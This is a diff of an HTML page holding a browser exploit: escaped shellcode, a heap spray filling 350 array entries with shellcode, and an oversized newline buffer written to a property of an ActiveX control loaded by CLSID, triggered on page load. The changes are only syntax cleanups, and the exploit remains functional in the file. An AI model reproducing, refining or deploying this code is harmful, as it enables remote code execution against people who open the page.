@@ -98,10 +98,10 @@ var shellcode2 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
 
         
 
-        var memory = new Array();
+        var memory = [];
         for (i = 0; i < 350; i++){ memory[i] = block + shellcode1 }
         
-        var buf = ""
+        var buf = "";
         for (i = 0; i < 260; i++) { buf = buf + unescape("%0A") }
         
         obj._DOWText0 = buf;
@@ -112,7 +112,7 @@ var shellcode2 = unescape("%u03eb%ueb59%ue805%ufff8%uffff%u4949%u4949%u4949" +
    
    </script>
   </head>
- <body onload="JavaScript: return Check();">
+ <body onload="return Check();">
         <object id="obj" classid="clsid:22ACD16F-99EB-11D2-9BB3-00400561D975">
                 Unable to create object
         </object>
